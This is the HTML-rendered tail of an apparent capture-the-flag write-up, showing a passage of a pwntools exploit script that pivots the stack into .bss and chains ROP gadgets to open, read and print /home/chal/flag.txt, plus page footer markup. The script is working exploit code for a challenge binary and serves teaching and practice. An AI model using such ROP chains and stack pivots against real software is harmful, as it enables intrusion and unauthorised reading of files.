</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040f01e</span>
</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000448d27</span>
</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040173f</span>
</span></span><span style=display:flex><span>syscall_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000448280</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bss_addr_open <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2700</span>
</span></span><span style=display:flex><span>bss_addr_read <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2800</span>
</span></span><span style=display:flex><span>bss_addr_write <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2900</span>
</span></span><span style=display:flex><span>main_fn <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401ce1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># raw_input()</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Modify RBP to a new Stack Space</span>
</span></span><span style=display:flex><span>trash_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x20</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(trash_payload <span style=color:#f92672>+</span> p64(bss_addr_open) <span style=color:#f92672>+</span> p64(main_fn))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Open /home/chal/flag.txt</span>
</span></span><span style=display:flex><span>file_addr <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/home/chal/flag.txt&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x20</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>ROP_open <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Open file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fd = open(&#34;/home/chal/flag.txt&#34;, 0);</span>
</span></span><span style=display:flex><span>    bss_addr_read,
</span></span><span style=display:flex><span>    pop_rax_ret,    <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret,    bss_addr_open <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x20</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret,    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdx_ret,    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    main_fn
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span><span style=color:#75715e># raw_input()</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_open)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Read flag.txt</span>
</span></span><span style=display:flex><span>ROP_read <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Read the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># read(fd, buf, 0x30);</span>
</span></span><span style=display:flex><span>    bss_addr_write,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>3</span>, 
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_read,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x30</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    main_fn
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span><span style=color:#75715e># raw_input()</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_read)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Write flat.txt to stdout</span>
</span></span><span style=display:flex><span>ROP_write <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Write the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># write(1, buf, 0x30);</span>
</span></span><span style=display:flex><span>    bss_addr_write,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_read,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x30</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span><span style=color:#75715e># raw_input()</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_write)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---ropchain--stack-pivot>Exploit - ROPchain + stack pivot</a></li></ul></nav></div></aside></main></body></html>